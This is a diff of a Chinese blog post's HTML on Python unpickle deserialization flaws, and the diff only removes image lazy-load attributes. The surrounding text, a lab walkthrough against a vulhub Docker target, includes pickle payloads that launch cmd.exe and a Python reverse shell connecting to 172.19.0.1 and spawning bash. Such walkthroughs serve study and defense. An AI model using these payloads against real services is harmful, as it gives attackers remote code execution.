@@ -285,7 +285,7 @@ class m3lon(object):
 pickle.dumps(m3lon())
 # 输出：&quot;csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.&quot;</code></pre><p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p>
 <p>下面模拟接收端</p>
-<p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" alt="img"></a></p>
+<p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" alt="img"></a></p>
 <p>弹出shell！</p>
 <h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p>
 <p>app.py</p>
@@ -333,7 +333,7 @@ print(response.content)</code></pre><p><strong>分析</strong></p>
 <pre><code>cposix\nsystem\np0\n(S\&#39;python -c \\\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.19.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);\\\&#39;\&#39;\np1\ntp2\nRp3\n.</code></pre><p>接收端在反序列化pickle.loads(user)过程中会自动执行<strong>reduce</strong>方法，弹出bash.</p>
 <p><strong>流程</strong></p>
 <p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p>
-<p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" srcset="/img/loading.gif" alt="img"></a></p>
+<p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" alt="img"></a></p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
